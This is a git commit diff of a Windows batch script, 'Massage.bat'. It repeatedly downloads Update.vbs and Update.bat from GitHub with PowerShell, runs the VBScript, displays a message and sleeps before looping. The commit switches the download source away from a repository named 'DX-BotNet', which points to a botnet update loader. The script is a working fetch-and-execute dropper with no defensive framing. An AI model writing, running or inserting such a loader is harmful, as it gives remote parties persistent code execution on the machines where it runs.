4d5047eaf7e8be066d921282470ca9f343ba7dc5
AbdulazizDXT <139559982+AbdulazizDXT@users.noreply.github.com>
2023-07-14 21:29:33 +0400

    Update Massage.bat

--- Massage.bat
+++ Massage.bat
@@ -1,16 +1,16 @@
 :start
 timeout /t 1
 echo #---------------------------------------------------------------------------------------------------------------------------#
-powershell -command "Invoke-WebRequest https://raw.githubusercontent.com/HyperDXT/DX-BotNet/main/Update.vbs -OutFile Update.vbs"
+powershell -command "Invoke-WebRequest https://raw.githubusercontent.com/AbdulazizDXT/Cardio/main/Update.vbs -OutFile Update.vbs"
 echo #---------------------------------------------------------------------------------------------------------------------------#
 timeout /t 5
 del Update.bat
 echo #---------------------------------------------------------------------------------------------------------------------------#
-powershell -command "Invoke-WebRequest https://raw.githubusercontent.com/HyperDXT/DX-BotNet/main/Update.bat -OutFile Update.bat"
+powershell -command "Invoke-WebRequest https://raw.githubusercontent.com/AbdulazizDXT/Cardio/main/Update.bat -OutFile Update.bat"
 timeout /t 5
 start Update.vbs
 echo #---------------------------------------------------------------------------------------------------------------------------#
-msg * YOUR Massage
+MSG /SERVER:127.0.0.1 * HELLO WORLD
 echo #---------------------------------------------------------------------------------------------------------------------------#
 timeout /t 900
 echo #---------------------------------------------------------------------------------------------------------------------------#
